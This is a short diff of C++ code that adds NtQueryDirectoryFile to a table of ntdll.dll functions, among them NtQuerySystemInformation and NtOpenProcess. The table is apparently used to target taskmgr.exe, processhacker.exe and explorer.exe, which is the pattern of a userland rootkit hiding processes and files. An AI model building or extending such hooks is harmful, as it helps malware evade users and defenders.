@@ -21,7 +21,8 @@ int main()
 		{ "ntdll.dll", "NtOpenProcess",				"ntop" },
 		{ "ntdll.dll", "NtQuerySystemInformation",	"qsi" },
 		{ "ntdll.dll", "NtCreateFile",				"ntcr"},
-		{ "ntdll.dll", "NtOpenFile",				"ntopf"}
+		{ "ntdll.dll", "NtOpenFile",				"ntopf"},
+		{ "ntdll.dll", "NtQueryDirectoryFile",		"ntqdf"}
 	};
 
 	for (const auto& process_name : { "taskmgr.exe", "processhacker.exe", "explorer.exe" })
